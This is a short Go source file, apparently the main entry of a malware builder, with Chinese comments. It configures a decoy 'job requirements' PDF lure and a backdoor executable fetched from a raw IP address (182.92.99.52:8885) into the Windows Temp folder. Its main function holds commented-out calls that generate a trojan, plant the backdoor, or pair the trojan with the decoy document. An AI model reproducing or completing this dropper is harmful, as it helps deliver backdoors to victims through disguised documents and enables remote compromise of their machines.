package main

const (
	//下载的文件存放处和打开文件路径
	path = "C:\\Windows\\Temp\\招聘要求1231.pdf"
	//path = "https://wx.qq.com/"
	//木马文件存放地址
	path1 = "C:\\Windows\\Temp\\test.exe"
	//下载文件的url
	url = "https://www.xixixiaoyu.com/tools/hold-all/招聘要求.pdf"
	//后门木马url
	url1 = "http://182.92.99.52:8885/test.exe"
)

//main方法
func main() {
	//只生成木马
	//generate.Onlymuma()
	//只植入后门
	//generate.Onlybackdoor(url1, path1)
	//生成木马弹出文件
	//generate.Tnuma(url, path)
	//生成木马弹出文件植入后门
	//generate.MTZmuma(url, path, url1, path1)
}
